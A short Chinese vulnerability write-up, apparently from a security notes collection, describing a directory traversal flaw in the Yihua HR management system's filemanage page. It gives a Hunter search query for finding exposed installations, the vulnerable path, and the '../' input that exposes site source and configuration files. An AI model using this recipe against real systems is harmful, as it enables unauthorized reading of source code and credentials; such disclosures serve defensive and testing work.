# 亿华人力资源管理系统filemanage存在目录遍历漏洞

# 一、漏洞简介
亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统filemanage存在目录遍历漏洞，可通过该漏洞查看网站源码及配置文件等敏感信息。

# 二、影响版本
+ 亿华人力资源管理系统

# 三、资产测绘
+ hunter`web.body="亿华人力资源管理系统"`
+ 特征

![1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e.png](./img/zcWQQp8jsVRLBX-8/1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e-732191.png)

# 四、漏洞复现
```plain
/filemanage/file/default.aspx
```

![1700989447803-6daa1ad8-0c21-4a3e-bcff-8558bef4a3da.png](./img/zcWQQp8jsVRLBX-8/1700989447803-6daa1ad8-0c21-4a3e-bcff-8558bef4a3da-078709.png)

在转到目录除输入`../`即可跳转到网站目录查看网站源码及各类配置文件

![1700989498664-e661c4dc-8bd3-483b-a458-23c4c7cd667b.png](./img/zcWQQp8jsVRLBX-8/1700989498664-e661c4dc-8bd3-483b-a458-23c4c7cd667b-645753.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gnluyfnyo0do37cq>